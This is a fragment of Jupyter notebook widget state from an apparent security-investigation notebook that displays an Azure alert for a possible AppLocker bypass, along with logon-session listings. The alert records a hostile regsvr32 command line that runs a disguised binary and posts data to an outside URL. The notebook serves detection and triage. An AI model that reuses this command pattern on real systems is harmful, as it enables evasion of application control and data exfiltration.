     "090a653be289451a8ac65e42a9b941d5": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "80%"
      }
     },
     "0a76619f2e284da9b1b69f9898bd3f3c": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_f42232e38d9243cd9cdbafcefe5a9a62",
        "IPY_MODEL_ff00f4ca894a495a8c6554ff6e267f78"
       ],
       "layout": "IPY_MODEL_37ae19b2d34e49c58ff904701b6c26e9"
      }
     },
     "0b99053b4f1d481188bbab10bc820a30": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "0be0e5fba26e4019b1ab1860d38f70ea": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "0e47408297ef41dca2360100a3566dc9": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "0f5cf9eee0ad4666b5dbd9bacc29a50d": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Filter alerts by title:",
       "layout": "IPY_MODEL_104b9fe73d004b7e956bed0fd389f48f",
       "style": "IPY_MODEL_0095173532d340dfaa5d2a07ab6cbdaa"
      }
     },
     "104b9fe73d004b7e956bed0fd389f48f": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "10b0a37aa2274b50b7e52e6520900c20": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "117f05e90fe74bdeac4c82068b2d48bd": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "12be7e2fe71f4993bbf37c201caac2b3": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "12ee50ab36e44abc89c30d3db8631a27": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "133361d329f044abb3a3abcab05c86eb": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "192c9ef6fca64b9184c07e7f8fa1a52e": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "height": "200px",
       "width": "40%"
      }
     },
     "1988aee567c448d78aebac786ab8e3f0": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "19fb218c3c6c417d89138cb524207c2f": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DatePickerModel",
      "state": {
       "description": "Origin Date",
       "disabled": false,
       "layout": "IPY_MODEL_117f05e90fe74bdeac4c82068b2d48bd",
       "style": "IPY_MODEL_a4275b4ea3864336b2937d274429cc50",
       "value": {
        "date": 14,
        "month": 1,
        "year": 2019
       }
      }
     },
     "1a45365064dc444fb2c87035e8606e5a": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_19fb218c3c6c417d89138cb524207c2f",
        "IPY_MODEL_3f0289bbd41e4baf9d5c5344859bb88d"
       ],
       "layout": "IPY_MODEL_9124bb2fddfa4b9fa87902de2492b4fe"
      }
     },
     "1aa664f98c42423384c5a5c08c47f5a4": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "1ae179fd2f2c4440af77f076811fca57": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "1aeb363aed9e4a078b83fd38ba3ff9d6": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "1afd55eb3aac4245ac92dbe701f55339": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "1e9fe74496ee46e5885db13fe316d835": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "SliderStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "22d12e652d8041e2a9c74bc5329997a6": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HTMLModel",
      "state": {
       "layout": "IPY_MODEL_7681be41c5fb493b872af664d1e02305",
       "style": "IPY_MODEL_923f90a16b0a4260a5a76967a69c73e9",
       "value": "<h4>Set query time boundaries</h4>"
      }
     },
     "238cc6ec052443808491e0af97343483": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_cdd0c0089cc64e4e81c7ff7842acf225",
        "IPY_MODEL_2ba412d33ce94f929c68ce26bd40678b"
       ],
       "layout": "IPY_MODEL_4c014001e1724a2ebf2f00ce17ea3f8f"
      }
     },
     "23e15a1a6712477c80955ca73178b1c1": {
      "model_module": "@jupyter-widgets/output",
      "model_module_version": "1.0.0",
      "model_name": "OutputModel",
      "state": {
       "layout": "IPY_MODEL_aceeb747da3e4c15b17475be45580eda",
       "outputs": [
        {
         "data": {
          "text/html": "\n            <h3>Alert: 'Potential attempt to bypass AppLocker detected'</h3><br>time=<b>2019-02-14 11:51:38</b>,\n            entity=<b>MSTICAlertsWin1</b>, id=<b>2518521557014927413_daa18e53-ab1d-4d7d-8c4f-bcb86f75fd5f</b>\n            <br/>\n            <table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>3</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>TenantId</th>\n      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n    </tr>\n    <tr>\n      <th>TimeGenerated</th>\n      <td>2019-02-14 11:52:06</td>\n    </tr>\n    <tr>\n      <th>AlertDisplayName</th>\n      <td>Potential attempt to bypass AppLocker detected</td>\n    </tr>\n    <tr>\n      <th>AlertName</th>\n      <td>Potential attempt to bypass AppLocker detected</td>\n    </tr>\n    <tr>\n      <th>Severity</th>\n      <td>High</td>\n    </tr>\n    <tr>\n      <th>Description</th>\n      <td>Analysis of host data on MSTICALERTSWIN1 detected a potential attempt to bypass AppLocker restrictions. AppLocker can be configured to implement a policy that limits what executables are allowed to run on a Windows system. The command line pattern similar to that identified in this alert has been previously associated with attacker attempts to circumvent AppLocker policy by using trusted executables (allowed by AppLocker policy) to execute untrusted code. This could be legitimate activity, or an indication of a compromised host.</td>\n    </tr>\n    <tr>\n      <th>ProviderName</th>\n      <td>Detection</td>\n    </tr>\n    <tr>\n      <th>VendorName</th>\n      <td>Microsoft</td>\n    </tr>\n    <tr>\n      <th>VendorOriginalId</th>\n      <td>daa18e53-ab1d-4d7d-8c4f-bcb86f75fd5f</td>\n    </tr>\n    <tr>\n      <th>SystemAlertId</th>\n      <td>2518521557014927413_daa18e53-ab1d-4d7d-8c4f-bcb86f75fd5f</td>\n    </tr>\n    <tr>\n      <th>ResourceId</th>\n      <td>/subscriptions/40dcc8bf-0478-4f3b-b275-ed0a94f2c013/resourceGroups/ASIHuntOMSWorkspaceRG/providers/Microsoft.Compute/virtualMachines/MSTICAlertsWin1</td>\n    </tr>\n    <tr>\n      <th>SourceComputerId</th>\n      <td>263a788b-6526-4cdc-8ed9-d79402fe4aa0</td>\n    </tr>\n    <tr>\n      <th>AlertType</th>\n      <td>SCUBA_RULE_Applocker_Bypass</td>\n    </tr>\n    <tr>\n      <th>ConfidenceLevel</th>\n      <td>Unknown</td>\n    </tr>\n    <tr>\n      <th>ConfidenceScore</th>\n      <td>NaN</td>\n    </tr>\n    <tr>\n      <th>IsIncident</th>\n      <td>False</td>\n    </tr>\n    <tr>\n      <th>StartTimeUtc</th>\n      <td>2019-02-14 11:51:38</td>\n    </tr>\n    <tr>\n      <th>EndTimeUtc</th>\n      <td>2019-02-14 11:51:38</td>\n    </tr>\n    <tr>\n      <th>ProcessingEndTime</th>\n      <td>2019-02-14 11:52:07</td>\n    </tr>\n    <tr>\n      <th>RemediationSteps</th>\n      <td>[\\r\\n  \"Review with MSTICALERTSWIN1\\\\MSTICAdmin the suspicious command line in this alert to see if you recognise this as legitimate activity that you expect to see on MSTICALERTSWIN1. If not, escalate the alert to the information security team.\"\\r\\n]</td>\n    </tr>\n    <tr>\n      <th>ExtendedProperties</th>\n      <td>{'Compromised Host': 'MSTICALERTSWIN1', 'User Name': 'MSTICALERTSWIN1\\MSTICAdmin', 'Account Session Id': '0x78225e', 'Suspicious Process': 'c:\\w!ndows\\system32\\regsvr32.exe', 'Suspicious Command Line': '.\\regsvr32  /u /s c:\\windows\\fonts\\csrss.exe \"http://www.401k.com/upload?pass=34592389\" post', 'Parent Process': 'c:\\windows\\system32\\cmd.exe', 'Suspicious Process Id': '0x1150', 'resourceType': 'Virtual Machine', 'ServiceId': '14fa08c7-c48e-4c18-950c-8148024b4398', 'ReportingSystem': 'Azure', 'OccuringDatacenter': 'eastus'}</td>\n    </tr>\n    <tr>\n      <th>Entities</th>\n      <td>[{'$id': '4', 'DnsDomain': '', 'NTDomain': '', 'HostName': 'MSTICALERTSWIN1', 'NetBiosName': 'MSTICALERTSWIN1', 'OSFamily': 'Windows', 'OSVersion': 'Windows', 'IsDomainJoined': False, 'Type': 'host'}, {'$id': '5', 'Directory': 'c:\\windows\\system32', 'Name': 'cmd.exe', 'Type': 'file'}, {'$id': '6', 'ProcessId': '0x12f4', 'CommandLine': '', 'ImageFile': {'$ref': '5'}, 'Host': {'$ref': '4'}, 'Type': 'process'}, {'$id': '7', 'Name': 'MSTICAdmin', 'NTDomain': 'MSTICAlertsWin1', 'Host': {'$ref': '4'}, 'Sid': 'S-1-5-21-996632719-2361334927-4038480536-500', 'IsDomainJoined': False, 'Type': 'account', 'LogonId': '0x78225e'}, {'$id': '8', 'Directory': 'c:\\w!ndows\\system32', 'Name': 'regsvr32.exe', 'Type': 'file'}, {'$id': '9', 'ProcessId': '0x1150', 'CommandLine': '.\\regsvr32  /u /s c:\\windows\\fonts\\csrss.exe \"http://www.401k.com/upload?pass=34592389\" post', 'ElevationToken': 'Default', 'CreationTimeUtc': '2019-02-14T11:51:38.5072586Z', 'ImageFile': {'$ref': '8'}, 'Account': {'$ref': '7'}, 'ParentProcess': {'$ref': '6'}, 'Host': {'$ref': '4'}, 'Type': 'process'}, {'$id': '10', 'SessionId': '0x78225e', 'StartTimeUtc': '2019-02-14T11:51:38.5072586Z', 'EndTimeUtc': '2019-02-14T11:51:38.5072586Z', 'Type': 'host-logon-session', 'Host': {'$ref': '4'}, 'Account': {'$ref': '7'}}]</td>\n    </tr>\n    <tr>\n      <th>SourceSystem</th>\n      <td>Detection</td>\n    </tr>\n    <tr>\n      <th>WorkspaceSubscriptionId</th>\n      <td>40dcc8bf-0478-4f3b-b275-ed0a94f2c013</td>\n    </tr>\n    <tr>\n      <th>WorkspaceResourceGroup</th>\n      <td>asihuntomsworkspacerg</td>\n    </tr>\n    <tr>\n      <th>ExtendedLinks</th>\n      <td></td>\n    </tr>\n    <tr>\n      <th>ProductName</th>\n      <td></td>\n    </tr>\n    <tr>\n      <th>ProductComponentName</th>\n      <td></td>\n    </tr>\n    <tr>\n      <th>Type</th>\n      <td>SecurityAlert</td>\n    </tr>\n    <tr>\n      <th>Computer</th>\n      <td>MSTICAlertsWin1</td>\n    </tr>\n    <tr>\n      <th>src_hostname</th>\n      <td>MSTICAlertsWin1</td>\n    </tr>\n    <tr>\n      <th>src_accountname</th>\n      <td></td>\n    </tr>\n    <tr>\n      <th>src_procname</th>\n      <td></td>\n    </tr>\n    <tr>\n      <th>host_match</th>\n      <td>True</td>\n    </tr>\n    <tr>\n      <th>acct_match</th>\n      <td>False</td>\n    </tr>\n    <tr>\n      <th>proc_match</th>\n      <td>False</td>\n    </tr>\n    <tr>\n      <th>CompromisedEntity</th>\n      <td>MSTICAlertsWin1</td>\n    </tr>\n  </tbody>\n</table><br/><h3>ExtendedProperties:</h3><table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>0</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>Compromised Host</th>\n      <td>MSTICALERTSWIN1</td>\n    </tr>\n    <tr>\n      <th>User Name</th>\n      <td>MSTICALERTSWIN1\\MSTICAdmin</td>\n    </tr>\n    <tr>\n      <th>Account Session Id</th>\n      <td>0x78225e</td>\n    </tr>\n    <tr>\n      <th>Suspicious Process</th>\n      <td>c:\\w!ndows\\system32\\regsvr32.exe</td>\n    </tr>\n    <tr>\n      <th>Suspicious Command Line</th>\n      <td>.\\regsvr32  /u /s c:\\windows\\fonts\\csrss.exe \"http://www.401k.com/upload?pass=34592389\" post</td>\n    </tr>\n    <tr>\n      <th>Parent Process</th>\n      <td>c:\\windows\\system32\\cmd.exe</td>\n    </tr>\n    <tr>\n      <th>Suspicious Process Id</th>\n      <td>0x1150</td>\n    </tr>\n    <tr>\n      <th>resourceType</th>\n      <td>Virtual Machine</td>\n    </tr>\n    <tr>\n      <th>ServiceId</th>\n      <td>14fa08c7-c48e-4c18-950c-8148024b4398</td>\n    </tr>\n    <tr>\n      <th>ReportingSystem</th>\n      <td>Azure</td>\n    </tr>\n    <tr>\n      <th>OccuringDatacenter</th>\n      <td>eastus</td>\n    </tr>\n  </tbody>\n</table><h3>Entity counts: </h3>host: 1, file: 2, process: 2, account: 1, hostlogonsession: 1",
          "text/plain": "<IPython.core.display.HTML object>"
         },
         "metadata": {},
         "output_type": "display_data"
        },
        {
         "name": "stdout",
         "output_type": "stream",
         "text": "{ 'AdditionalData': {},\n  'DnsDomain': '',\n  'HostName': 'MSTICALERTSWIN1',\n  'IsDomainJoined': False,\n  'NTDomain': '',\n  'NetBiosName': 'MSTICALERTSWIN1',\n  'OSFamily': 'Windows',\n  'Type': 'host'}\n{ 'AdditionalData': {},\n  'Directory': 'c:\\\\windows\\\\system32',\n  'FullPath': 'c:\\\\windows\\\\system32\\\\cmd.exe',\n  'Name': 'cmd.exe',\n  'Type': 'file'}\n{ 'AdditionalData': {},\n  'CommandLine': '',\n  'Host': { 'AdditionalData': {},\n            'DnsDomain': '',\n            'HostName': 'MSTICALERTSWIN1',\n            'IsDomainJoined': False,\n            'NTDomain': '',\n            'NetBiosName': 'MSTICALERTSWIN1',\n            'OSFamily': 'Windows',\n            'Type': 'host'},\n  'ImageFile': { 'AdditionalData': {},\n                 'Directory': 'c:\\\\windows\\\\system32',\n                 'FullPath': 'c:\\\\windows\\\\system32\\\\cmd.exe',\n                 'Name': 'cmd.exe',\n                 'Type': 'file'},\n  'ProcessId': '0x12f4',\n  'Type': 'process'}\n{ 'AdditionalData': {},\n  'Host': { 'AdditionalData': {},\n            'DnsDomain': '',\n            'HostName': 'MSTICALERTSWIN1',\n            'IsDomainJoined': False,\n            'NTDomain': '',\n            'NetBiosName': 'MSTICALERTSWIN1',\n            'OSFamily': 'Windows',\n            'Type': 'host'},\n  'IsDomainJoined': False,\n  'LogonId': '0x78225e',\n  'NTDomain': 'MSTICAlertsWin1',\n  'Name': 'MSTICAdmin',\n  'Sid': 'S-1-5-21-996632719-2361334927-4038480536-500',\n  'Type': 'account'}\n{ 'AdditionalData': {},\n  'Directory': 'c:\\\\w!ndows\\\\system32',\n  'FullPath': 'c:\\\\w!ndows\\\\system32\\\\regsvr32.exe',\n  'Name': 'regsvr32.exe',\n  'Type': 'file'}\n{ 'Account': { 'AdditionalData': {},\n               'Host': { 'AdditionalData': {},\n                         'DnsDomain': '',\n                         'HostName': 'MSTICALERTSWIN1',\n                         'IsDomainJoined': False,\n                         'NTDomain': '',\n                         'NetBiosName': 'MSTICALERTSWIN1',\n                         'OSFamily': 'Windows',\n                         'Type': 'host'},\n               'IsDomainJoined': False,\n               'LogonId': '0x78225e',\n               'NTDomain': 'MSTICAlertsWin1',\n               'Name': 'MSTICAdmin',\n               'Sid': 'S-1-5-21-996632719-2361334927-4038480536-500',\n               'Type': 'account'},\n  'AdditionalData': {},\n  'CommandLine': '.\\\\regsvr32  /u /s c:\\\\windows\\\\fonts\\\\csrss.exe '\n                 '\"http://www.401k.com/upload?pass=34592389\" post',\n  'CreationTimeUtc': '2019-02-14T11:51:38.5072586Z',\n  'ElevationToken': 'Default',\n  'Host': { 'AdditionalData': {},\n            'DnsDomain': '',\n            'HostName': 'MSTICALERTSWIN1',\n            'IsDomainJoined': False,\n            'NTDomain': '',\n            'NetBiosName': 'MSTICALERTSWIN1',\n            'OSFamily': 'Windows',\n            'Type': 'host'},\n  'ImageFile': { 'AdditionalData': {},\n                 'Directory': 'c:\\\\w!ndows\\\\system32',\n                 'FullPath': 'c:\\\\w!ndows\\\\system32\\\\regsvr32.exe',\n                 'Name': 'regsvr32.exe',\n                 'Type': 'file'},\n  'ParentProcess': { 'AdditionalData': {},\n                     'CommandLine': '',\n                     'Host': { 'AdditionalData': {},\n                               'DnsDomain': '',\n                               'HostName': 'MSTICALERTSWIN1',\n                               'IsDomainJoined': False,\n                               'NTDomain': '',\n                               'NetBiosName': 'MSTICALERTSWIN1',\n                               'OSFamily': 'Windows',\n                               'Type': 'host'},\n                     'ImageFile': { 'AdditionalData': {},\n                                    'Directory': 'c:\\\\windows\\\\system32',\n                                    'FullPath': 'c:\\\\windows\\\\system32\\\\cmd.exe',\n                                    'Name': 'cmd.exe',\n                                    'Type': 'file'},\n                     'ProcessId': '0x12f4',\n                     'Type': 'process'},\n  'ProcessId': '0x1150',\n  'Type': 'process'}\n{ 'Account': { 'AdditionalData': {},\n               'Host': { 'AdditionalData': {},\n                         'DnsDomain': '',\n                         'HostName': 'MSTICALERTSWIN1',\n                         'IsDomainJoined': False,\n                         'NTDomain': '',\n                         'NetBiosName': 'MSTICALERTSWIN1',\n                         'OSFamily': 'Windows',\n                         'Type': 'host'},\n               'IsDomainJoined': False,\n               'LogonId': '0x78225e',\n               'NTDomain': 'MSTICAlertsWin1',\n               'Name': 'MSTICAdmin',\n               'Sid': 'S-1-5-21-996632719-2361334927-4038480536-500',\n               'Type': 'account'},\n  'AdditionalData': {},\n  'EndTimeUtc': '2019-02-14T11:51:38.5072586Z',\n  'Host': { 'AdditionalData': {},\n            'DnsDomain': '',\n            'HostName': 'MSTICALERTSWIN1',\n            'IsDomainJoined': False,\n            'NTDomain': '',\n            'NetBiosName': 'MSTICALERTSWIN1',\n            'OSFamily': 'Windows',\n            'Type': 'host'},\n  'SessionId': '0x78225e',\n  'StartTimeUtc': '2019-02-14T11:51:38.5072586Z',\n  'Type': 'hostlogonsession'}\n"
        }
       ]
      }
     },
     "24f10def54ec4b11b5a250087559845b": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Query end time (UTC) :  ",
       "layout": "IPY_MODEL_1afd55eb3aac4245ac92dbe701f55339",
       "style": "IPY_MODEL_72c38d382eb2437ba4d3265b71ddafb6",
       "value": "2019-02-23 19:04:00.244055"
      }
     },
     "2549f58d87bc4a6c9fd035c1dedcff31": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "2600745c32c94f7d9589c66abb058bf1": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "26db45a6b40f429b908fd3c825b8f0e6": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "27142b0811454656ae1639b31ee89b36": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonModel",
      "state": {
       "description": "⇽ Remove All",
       "layout": "IPY_MODEL_9682fd38ea534559ba2dee092d4a265f",
       "style": "IPY_MODEL_a80dcf8eb79c4d7ba7c25c41b370a0a8"
      }
     },
     "28c114e2c203434fadaac68d323e92d1": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "295dab2306b744248315afd5ae1a20c6": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "29b16623083c427e90cf25bb8cb92c94": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HTMLModel",
      "state": {
       "layout": "IPY_MODEL_747fe41e41824498a0f5e532d037f664",
       "style": "IPY_MODEL_4bdf6470d75d4ffcbc30ac623a74f203",
       "value": "<h4>Set query time boundaries</h4>"
      }
     },
     "29d6601088794722801b0f99645270c6": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "2ba412d33ce94f929c68ce26bd40678b": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "SelectModel",
      "state": {
       "_options_labels": [
        "SYSTEM:    (logontype 5)   timerange: 2019-02-09 12:32:50.220000 - 2019-02-15 11:51:37.597000    count: 120",
        "MSTICAdmin:    (logontype 4)   timerange: 2019-02-09 23:26:47.700000 - 2019-02-14 11:51:37.603000    count: 8",
        "MSTICAdmin:    (logontype 3)   timerange: 2019-02-12 04:37:25.340000 - 2019-02-15 03:57:00.207000    count: 8",
        "SYSTEM:    (logontype 0)   timerange: 2019-02-12 04:40:03.870000 - 2019-02-14 04:20:54.370000    count: 2",
        "NETWORK SERVICE:    (logontype 5)   timerange: 2019-02-12 04:40:04.207000 - 2019-02-14 04:20:54.630000    count: 2",
        "DWM-1:    (logontype 2)   timerange: 2019-02-12 04:40:04.483000 - 2019-02-14 04:20:54.773000    count: 4",
        "LOCAL SERVICE:    (logontype 5)   timerange: 2019-02-12 04:40:04.573000 - 2019-02-14 04:20:54.803000    count: 2",
        "IUSR:    (logontype 5)   timerange: 2019-02-12 04:40:12.360000 - 2019-02-14 04:20:56.110000    count: 2",
        "DWM-2:    (logontype 2)   timerange: 2019-02-12 20:19:43.440000 - 2019-02-15 03:57:01.903000    count: 6",
        "MSTICAdmin:    (logontype 10)   timerange: 2019-02-12 20:19:44.767000 - 2019-02-15 03:57:02.593000    count: 2",
        "ian:    (logontype 2)   timerange: 2019-02-12 20:29:51.030000 - 2019-02-12 20:29:51.030000    count: 2",
        "ian:    (logontype 4)   timerange: 2019-02-12 20:41:17.310000 - 2019-02-12 20:41:17.310000    count: 1",
        "ian:    (logontype 3)   timerange: 2019-02-13 00:55:38.670000 - 2019-02-15 03:56:34.440000    count: 5"
       ],
       "description": "Select logon cluster to examine",
       "index": 0,
       "layout": "IPY_MODEL_97199b8228444ce482fef2e7c4046b36",
       "style": "IPY_MODEL_7bd4f4bc359b44e382223393f1994374"
      }
     },
     "2cc7d9fbfee446b2b53a416965d544ab": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "2e9ee84e6e834fa59907b388a3d3bc77": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "height": "200px",
       "width": "40%"
      }
     },
     "2f9599f3732741d78f8a451140a8397f": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "3096fdc566da423da13dbce4cccf1edc": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_f7dc25a23f4448a594a7bd3e2bfcc2b8",
        "IPY_MODEL_772b1ec46fb144fd93dc475f44e0503b"
       ],
       "layout": "IPY_MODEL_6873ecd8427c4c2591dacab099e3b0cc"
      }
     },
     "30baa2c85bb64cf6a60e1e4e7c807d59": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "30bbda02b41b4a2ba49cc883d52185ab": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "30d2b76767f3411b9e59d057a1ce2abe": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "30ff1bc49ff1437ea7d15558312b2e33": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonStyleModel",
      "state": {}
     },
     "363e18d4b49649fc9848b7badb92fb92": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HTMLModel",
      "state": {
       "layout": "IPY_MODEL_6316fbd42bb84e26979f482006a682a7",
       "style": "IPY_MODEL_a17fefc8f73140c5bf292064a7b210e5",
       "value": "<h4>Set query time boundaries</h4>"
      }
     },
     "3787982f853c4bec8aed0f195c8df89b": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Query start time (UTC):",
       "layout": "IPY_MODEL_7cbcf6ab9c9f4511b4838c422230bdee",
       "style": "IPY_MODEL_5fc4c7a20f3a4161b95b8ff1362b9a03",
       "value": "2019-02-09 11:32:50.220000"
      }
     },
     "3798c9cadbe84e8f8c7f705853c45957": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "37ae19b2d34e49c58ff904701b6c26e9": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "3a33e511282d4afea6e27708fcec3cf6": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_d95d0f4e03454766a113849ed1a46876",
        "IPY_MODEL_4fb6c7923bb64be5aebfbf69278dc2de"
       ],
       "layout": "IPY_MODEL_0e47408297ef41dca2360100a3566dc9"
      }
     },
     "3d6a7a39288843bebb5f6126f960dcb7": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonStyleModel",
      "state": {}
     },
     "3f0289bbd41e4baf9d5c5344859bb88d": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Time (24hr)",
       "layout": "IPY_MODEL_8b9b66d40858428aa8624a7bf797969e",
       "style": "IPY_MODEL_1988aee567c448d78aebac786ab8e3f0",
       "value": "11:52:06"
      }
     },
     "3f9f777b6c9a4f2d977c8c2667c38ef2": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "SelectModel",
      "state": {
       "_options_labels": [
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-09 12:32:50.220000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-09 12:35:51.683000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-10 00:45:29.713000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-10 00:45:32.373000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-10 00:48:31.607000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-10 05:10:54.300000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-10 20:02:44.460000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-10 20:03:29.680000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-10 20:03:56.173000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-10 20:03:57.417000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-10 20:06:58.907000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-10 21:47:20.740000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-10 21:47:21.503000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-11 05:10:54.183000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-11 09:59:02.593000)    logonid=0x3e7",
        "SYSTEM:    (logontype=0)   (timestamp=2019-02-12 04:40:03.870000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 04:40:04.083000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 04:40:04.997000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 04:40:05.093000)    logonid=0x3e7",
